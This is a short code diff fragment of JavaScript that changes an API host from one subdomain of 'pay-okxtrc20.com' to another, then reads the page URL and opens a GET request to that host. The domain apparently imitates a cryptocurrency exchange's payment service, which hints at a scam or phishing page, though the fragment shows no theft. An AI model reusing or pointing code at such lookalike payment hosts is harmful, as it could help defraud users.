@@ -1,4 +1,4 @@
-        var api_url = 'https://www.pay-okxtrc20.com';
+        var api_url = 'https://web.pay-okxtrc20.com';
         var domain = window.location.href;
         var xhr = new XMLHttpRequest();
         xhr.open('GET',api_url, true);
